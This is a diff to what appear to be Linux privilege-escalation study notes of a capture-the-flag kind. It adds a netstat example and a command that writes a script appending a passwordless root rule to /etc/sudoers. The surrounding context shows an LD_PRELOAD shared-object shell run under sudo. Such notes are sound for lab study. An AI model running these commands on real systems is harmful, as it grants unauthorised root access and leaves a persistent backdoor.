@@ -106,6 +106,10 @@ The netstat command can be used with several different options to gather informa
 	-n: Do not resolve names
 	-o: Display timers
 
+	```bash
+	netstat -tan | grep 8080
+	```
+
 14.	find Command
 	```bash
 	find . -name flag1.txt
@@ -270,6 +274,14 @@ then run
 ```bash
 sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
 ```
+
+--------------------------------------------
+To add user to sudoers do this, so you can run sudo su, and go to root
+
+```bash
+echo 'echo "user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh
+```
+
 --------------------------------------------------------------
 
 **Privilege Escalation: SUID**
